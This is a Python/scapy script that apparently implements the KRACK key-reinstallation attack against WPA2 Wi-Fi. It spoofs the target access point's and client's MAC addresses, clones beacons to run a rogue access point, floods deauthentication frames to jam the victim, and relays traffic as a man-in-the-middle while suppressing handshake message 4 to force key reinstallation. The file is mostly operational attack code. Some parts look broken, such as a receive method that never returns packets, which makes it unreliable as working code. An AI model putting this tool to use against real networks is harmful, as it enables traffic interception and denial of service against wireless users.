#!/usr/bin/env python2
# -*- coding: UTF-8 -*-

import argparse
import threading
import re
import time
import ctypes
import struct
from scapy.all import *

import logging

from scapy.layers.dot11 import Dot11

logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
conf.verb = 0

DEBUG = False
MAXTIMEOUT = 5
if DEBUG: MAXTIMEOUT = 0.1
SEQNUM = 0
JAMMING = None
event_jamming = None
jamming_thread = None
PTKINSTALLED = False
DEBUG_C = 0

channels = {
    1: "\x6c\x09",
    2: "\x71\x09",
    3: "\x76\x09",
    4: "\x7b\x09",
    5: "\x80\x09",
    6: "\x85\x09",
    7: "\x8a\x09",
    8: "\x8f\x09",
    9: "\x94\x09",
    10: "\x99\x09",
    11: "\x9e\x09",
    12: "\xa3\x09",
    13: "\xa8\x09",
    14: "\xb4\x09"
}

clock_gettime = ctypes.CDLL(ctypes.util.find_library('c'),
                use_errno=True).clock_gettime

if DEBUG:
    packets = rdpcap("./example.pcapng")
    beacon_example = packets[6237]
    probe_response_example = packets[738]


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument("-d",
                        "--direct",
                        action="store_true",
                        help="Skip channel and monitor settings")

    parser.add_argument("-a",
                        "--access_point",
                        required=True,
                        help="Enter the SSID of the specific access point to target")

    parser.add_argument("-i",
                        "--iface_ap",
                        required=True,
                        help="Enter the SSID of the specific access point to target")

    parser.add_argument("-b",
                        "--client",
                        required=True,
                        help="Enter the MAC address of the specific client to target")

    parser.add_argument("-j",
                        "--iface_client",
                        required=True,
                        help="Enter the SSID of the specific access point to target")

    parser.add_argument("-c",
                        "--channel",
                        required=True,
                        type=int,
                        help="Choose channel on which the targeted access point is listening on")

    return parser.parse_args()

class Utils():

    class timespec(ctypes.Structure):
                    """Time specification, as described in clock_gettime(3)."""
                    _fields_ = (('tv_sec', ctypes.c_long),
                                ('tv_nsec', ctypes.c_long))

    @staticmethod
    def monotonic():
        ts = Utils.timespec()
        clock_gettime(1, ctypes.pointer(ts))
        return ts.tv_sec + ts.tv_nsec / 1.0e9

    @staticmethod
    def get_monotonic_str():
        return struct.pack("<Q", int(Utils.monotonic()*100000))[:5]

class Logger():
    def __init__(self):
        self.colors = {
            'W': '\033[0m',  # white (normal)
            'R': '\033[31m',  # red
            'G': '\033[32m',  # green
            'O': '\033[33m',  # orange
            'B': '\033[34m',  # blue
            'P': '\033[35m',  # purple
            'C': '\033[36m',  # cyan
            'GR': '\033[37m',  # gray
            'T': '\033[93m'  # tan
        }
        self.priority = {
            'info': self.colors['W'],
            'warning': self.colors['O'],
            'error': self.colors['R'],
            'success': self.colors['G']
        }

    def log(self, msg, level='info'):
        '''
        Available levels :
            info
            warning
            error
            success
        '''
        symbol = '*' if level != 'error' else '!'

        symbol_color = self.priority[level]

        if level in ['warning', 'error']:
            msg_color = symbol_color
        else:
            msg_color = self.colors['W']

        '''
        Inserts colors between tags
        Example: This [G]word[/G] will be green
        '''
        msg = re.sub(r"\[([A-Z]+)\](.*?)\[/([A-Z]+)\]",
                     lambda x: (self.colors.get(x.group(1), "")) + x.group(2) + msg_color, msg)

        print '[' + symbol_color + symbol + self.colors['W'] + '] ' + msg_color + msg + self.colors['W']


class Jammer:
    def __init__(self, args):
        self.iface_ap = args.iface_ap
        self.ap_channel = args.channel
        self.ap_ssid = args.access_point
        self.ap_mac = args.ap_mac
        self.client_mac = args.client
        self.direct = args.direct

    def deauth(self, e):
        global SEQNUM

        pkts = []

        deauth_pkt1 = RadioTap()/Dot11(addr1=self.client_mac, addr2=self.ap_mac, addr3=self.ap_mac) / Dot11Deauth()
        deauth_pkt2 = RadioTap()/Dot11(addr1=self.ap_mac, addr2=self.client_mac, addr3=self.client_mac) / Dot11Deauth()
        pkts.append(deauth_pkt1)
        pkts.append(deauth_pkt2)

        logger.log(
            "Starting deauth on AP [G]"
            + self.ap_mac
            + "[/G] (" + self.ap_ssid + ") and client [G]" + self.client_mac + "[/G]...")

        while not e.isSet():
            for p in pkts:
                SEQNUM += 1
                p[RadioTap].SC = SEQNUM 
                sendp(p, iface=self.iface_ap, inter=0.1 / len(pkts))

        logger.log("Deauth [G]stopped[/G]")


class SocketClient(L2Socket):
    def __init__(self, **kwargs):
        super(SocketClient, self).__init__(**kwargs)

    def send(self, p):
        L2Socket.send(self, RadioTap() / p)

    def recv(self, x=MTU):
        p = L2Socket.recv(self, x)
        if p == None or not Dot11 in p:
            return None


class Krack:
    def __init__(self, args):
        self.iface_ap = args.iface_ap
        self.iface_client = args.iface_client
        self.ap_channel = args.channel
        self.ap_ssid = args.access_point
        self.ap_mac = None
        self.client_mac = args.client
        self.direct = args.direct
        self.ap_beacon = None
        self.ap_probe_response = None

        self.sock_ap = None
        self.sock_client = None

        """
        New channel for Rogue AP
        """
        self.client_channel = (self.ap_channel + 6) % 13

        if not self.direct:
            '''
            Turn off interfaces
            '''
            self.ifaces_down()
            '''
            Switch AP iface channel
            '''
            self.set_iface_ap_channel()
            '''
            Switch Client iface channel
            '''
            self.set_iface_client_channel()
            '''
            Start monitor mode on ap
            '''
            self.start_ap_mon_mode()
            '''
            Start monitor mode on client
            '''
            self.start_client_mon_mode()
            '''
            Turn on interfaces
            '''
            self.ifaces_up()

        else:
            logger.log("Channel and Monitor settings skipped!", "warning")

        args.ap_mac = self.get_ap_mac()

        logger.log("Jammer initialized correctly", "success")

    def ifaces_down(self):
        logger.log("Turning off both interfaces")
        os.system('ip link set %s down' % self.iface_ap)
        os.system('ip link set %s down' % self.iface_client)

    def set_iface_ap_channel(self):
        logger.log("Setting interface [G]" + self.iface_ap + "[/G] on channel [G]" + str(self.ap_channel) + "[/G]")
        try:
            os.system("iwconfig " + self.iface_ap + " channel " + str(self.ap_channel))
        except Exception:
            logger.log("Channel setting failed.", "error")
            sys.exit()
        logger.log("Interface [G]" + self.iface_ap + "[/G] is on channel [G]" + str(self.ap_channel) + "[/G]", "success")

    def set_iface_client_channel(self):
        logger.log(
            "Setting interface [G]" + self.iface_client + "[/G] on channel [G]" + str(self.client_channel) + "[/G]",
            "info")
        try:
            os.system("iwconfig " + self.iface_client + " channel " + str(self.client_channel))
        except Exception:
            logger.log("Channel setting failed.", "error")
            sys.exit()
        logger.log(
            "Interface [G]" + self.iface_client + "[/G] is on channel [G]" + str(self.client_channel) + "[/G]",
            "success")

    def start_ap_mon_mode(self):
        try:
            logger.log("Starting monitor mode for [G]" + self.iface_ap + "[/G]")
            os.system('iwconfig %s mode monitor' % self.iface_ap)
            logger.log("Interface [G]" + self.iface_ap + "[/G] is now in monitor mode", "success")
        except Exception:
            logger.log("Could not start monitor mode", "error")
            sys.exit()

    def start_client_mon_mode(self):
        try:
            logger.log("Starting monitor mode for [G]" + self.iface_client + "[/G]")
            os.system('iwconfig %s mode monitor' % self.iface_client)
            logger.log("Interface [G]" + self.iface_client + "[/G] is now in monitor mode", "success")
        except Exception:
            logger.log("Could not start monitor mode", "error")
            sys.exit()

    def ifaces_up(self):
        logger.log("Turning on both interfaces")
        os.system('ip link set %s up' % self.iface_ap)
        os.system('ip link set %s up' % self.iface_client)

    def check_ap(self, pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.info == self.ap_ssid:
            self.ap_mac = pkt[Dot11].addr3.lower()
            return True

    def get_ap_mac(self):
        logger.log("Trying to find [G]%s[/G] MAC address" % self.ap_ssid)

        sniff(iface=self.iface_ap, store=0, stop_filter=self.check_ap, timeout=MAXTIMEOUT)

        if DEBUG:
            self.ap_mac = "08:3e:5d:6f:13:98"
        if self.ap_mac is None:
            # If AP MAC address could not be found
            logger.log("Could not retreive AP MAC address", "error")
            sys.exit()

        logger.log("MAC Found ! [G]%s[/G]" % self.ap_mac, "success")

        return self.ap_mac

    def get_ap_beacon(self):
        global beacon_example
        logger.log("Sniffing an AP Beacon...")
        pkt = sniff(iface=self.iface_ap, stop_filter=self.cb_get_ap_beacon, store=0, timeout=MAXTIMEOUT)
        if DEBUG:
            self.ap_beacon = beacon_example
        if self.ap_beacon is None:
            # If AP MAC address could not be found
            logger.log("Could not retreive an AP Beacon", "error")
            sys.exit()
        logger.log("AP Beacon saved!", "success")   
        return pkt

    def cb_get_ap_beacon(self, pkt):
        if (pkt.haslayer(Dot11)
            and pkt.type == 0
            and pkt.subtype == 8  # Beacon
            and pkt[Dot11].addr3.lower() == self.ap_mac):  # From AP

            self.ap_beacon = pkt
            return True

    def get_ap_probe_response(self):
        global probe_response_example, SEQNUM
        logger.log("Sniffing an AP Probe response...")
        pkt = sniff(iface=self.iface_ap, stop_filter=self.cb_get_ap_probe_response, store=0, timeout=MAXTIMEOUT)
        if DEBUG:
            self.ap_probe_response = probe_response_example
        if self.ap_probe_response is None:
            # If AP MAC address could not be found
            logger.log("Could not retreive an AP Probe response", "error")
            sys.exit()
        logger.log("AP Probe response saved!", "success")
        SEQNUM = self.ap_probe_response[Dot11].SC
        return pkt

    def cb_get_ap_probe_response(self, pkt):
        if (pkt.haslayer(Dot11)
            and pkt.type == 0
            and pkt.subtype == 0x05  # Probe Response
            and pkt[Dot11].addr1 == self.client_mac  # To client
            and pkt[Dot11].addr2 == self.ap_mac):
            # From AP

            self.ap_probe_response = pkt
            return True

    def set_iface_mac_address(self):
        if not self.direct:
            logger.log("Updating [G]%s[/G] MAC address to [G]%s[/G] (Client MAC)" % (self.iface_ap, self.client_mac),
                       "info")
            os.system('ip link set dev %s down' % self.iface_ap)
            os.system('ip link set dev %s address %s' % (self.iface_ap, self.client_mac))
            os.system('ip link set dev %s up' % self.iface_ap)
            logger.log("[G]%s[/G] MAC address update successful" % self.iface_ap, "success")

            logger.log("Updating [G]%s[/G] MAC address to [G]%s[/G] (Real AP MAC)" % (self.iface_client, self.ap_mac),
                       "info")
            os.system('ip link set dev %s down' % self.iface_client)
            os.system('ip link set dev %s address %s' % (self.iface_client, self.ap_mac))
            os.system('ip link set dev %s up' % self.iface_client)
            logger.log("[G]%s[/G] MAC address update successful" % self.iface_client, "success")

        else:
            logger.log("Update ethernet address settings skipped!", "warning")

        self.sock_ap = L2Socket(iface=self.iface_ap, type=ETH_P_ALL)
        self.sock_client = L2Socket(iface=self.iface_client, type=ETH_P_ALL)

    @staticmethod
    def is_handshake_packet(pkt):
        return (pkt.type == 0
                and pkt.subtype == 4  # Probe Request
                and pkt[Dot11].addr1.lower() == "ff:ff:ff:ff:ff:ff")

    def handle_pkt_ap(self):
        pkt = self.sock_ap.recv()

        # Don't forward not Dot11 packets, or packets not sent to our client
        if (pkt is None
            or Dot11 not in pkt
            or pkt[Dot11].addr1 != self.client_mac
            or pkt[Dot11].addr2 != self.ap_mac):
            return 0

        # Don't forward control frames
        if pkt.type == 1:  # TYPE_CNTRL
            return 0

        # Drop Beacons as we inject ours
        if pkt.type == 0 and pkt.subtype == 0x08:  # Beacon
            return 0

        # Check if pkt needs to be forwarded or not

        res = self.analyze_traffic(pkt)

        if res > 0:
            self.send_to_client(pkt)

    def handle_pkt_client(self):
        global SEQNUM, JAMMING, PTKINSTALLED, jamming_thread, event_jamming, DEBUG_C
        if DEBUG:
            pkt = packets[DEBUG_C + 5577] # Probe Request
        else:
            pkt = self.sock_client.recv()

        # Drop useless packets
        if pkt is None or Dot11 not in pkt:
            return 0

        # Don't forward control frames
        if pkt.type == 1:  # TYPE_CNTRL
            return 0
            
        # Forward to AP or probe requests
        if ((pkt[Dot11].addr1 != self.ap_mac
            or pkt[Dot11].addr2 != self.client_mac)
            and not self.is_handshake_packet(pkt)):

            return 0

        # Probe Request, we reply ourselves
        if pkt.type == 0 and pkt.subtype == 0x04:  # Probe Request
            # Update Sequence Number

            logger.log("Probe request to our AP")
            SEQNUM += 1
            self.ap_probe_response[Dot11].SC = SEQNUM
            self.send_to_client(self.ap_probe_response)

            return 0

        if JAMMING and pkt.type == 0 and pkt.subtype == 0x0b:  # Authentication
            # MitMed so no need for more Jamming
            logger.log("Client authenticated to our AP!", "success")
            event_jamming.set()
            JAMMING = False
            logger.log("MitM attack has [G]started[/G]", "success")

        if pkt.type == 2 and pkt.subtype == 0x08 and str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
            if not PTKINSTALLED:
                logger.log("PKT [G]installed[/G] on client", "success")
            else:
                logger.log("PKT [G]RE-installed[/G] on client! Key Reinstallation succes!", "success")
            PTKINSTALLED = True

            # Don't forward, AP will think no response and send msg3 again
            return 0

        # Check if pkt needs to be forwarded or not
        res = self.analyze_traffic(pkt)

        if res > 0:

            self.send_to_ap(pkt)

    def send_ap_beacon(self):
        logger.log("Rogue AP started. Sending beacons...", "success")
        sendp(self.ap_beacon, iface=self.iface_client, inter=0.1, loop=1)

    def analyze_traffic(self, pkt):
        # do not forward probe responses, we reply ourselves
        if pkt.type == 0 and pkt.subtype == 0x05:
            return 0

        # @TODO fix network name in association request (doesn't contain channel) ?

        if pkt.type == 10 and pkt.subtype == 0x28:  # Data - QoS data
            if pkt[Raw].startswith("\x02\x00\x8a"):  # Msg1
                logger.log("4-way handshake : [G]Messag 1/4[/G]", "success")
            elif pkt[Raw].startswith("\x02\x01\x0a"):  # Msg2
                logger.log("4-way handshake : [G]Messag 2/4[/G]", "success")
            elif pkt[Raw].startswith("\x02\x13\xca"):  # Msg3
                logger.log("4-way handshake : [G]Messag 3/4[/G]", "success")
            elif pkt[Raw].startswith("\x02\x03\x0a"):  # Msg4
                logger.log("4-way handshake : [G]Messag 4/4[/G]", "success")
            return 0

        return 1

    def send_to_ap(self, pkt):
        global SEQNUM
        self.update_ts(pkt)
        self.set_channel(pkt, self.ap_channel)

        SEQNUM += 1
        pkt[RadioTap].SC = SEQNUM 

        sendp(pkt, iface=self.iface_ap)

    def send_to_client(self, pkt):
        global SEQNUM
        self.update_ts(pkt)
        self.set_channel(pkt, self.client_channel)

        SEQNUM += 1
        pkt[RadioTap].SC = SEQNUM 

        sendp(pkt, iface=self.iface_client)

    def set_channel(self, pkt, channel):
        pkt[RadioTap].notdecoded = pkt[RadioTap].notdecoded[:10] + channels[channel] + pkt[RadioTap].notdecoded[12:]
        
    def update_ts(self, pkt):
        pkt[RadioTap].notdecoded = Utils.get_monotonic_str() + pkt[RadioTap].notdecoded[5:]

    def run(self):
        global DEBUG_C
        logger.log("Running main loop", "success")

        while True:
            sel = select.select([self.sock_ap, self.sock_client], [], [], 1)
            if DEBUG:
                DEBUG_C += 1
                self.handle_pkt_client()
            if self.sock_client in sel[0]:
                self.handle_pkt_client()

            if self.sock_ap in sel[0]:
                self.handle_pkt_ap()


if __name__ == "__main__":

    logger = Logger()

    if os.geteuid():
        logger.log('Please run as root!', 'error')
        sys.exit()

    args = parse_args()

    """
    0. Initialization
    """
    krack = Krack(args)

    s_ap = SocketClient(iface=args.iface_ap)
    s_client = SocketClient(iface=args.iface_client)

    """
    1. Get Beacon of AP to clone
    """
    krack.get_ap_beacon()

    """
    2. Get probe response we will use ourselves
    """
    krack.get_ap_probe_response()

    """
    3. Set device MAC address
    """
    krack.set_iface_mac_address()

    """
    4. Start Fake AP Beaconing
    """
    ap_beacon_thread = threading.Thread(target=krack.send_ap_beacon)
    ap_beacon_thread.setDaemon(True)
    ap_beacon_thread.start()

    """
    5. Start Jamming
    """
    jammer = Jammer(args)
    event_jamming = threading.Event()
    jamming_thread = threading.Thread(target=jammer.deauth, args=(event_jamming,))
    jamming_thread.setDaemon(True)
    jamming_thread.start()
    JAMMING = True

    """
    6. Forward traffic when needed
    """
    krack.run()
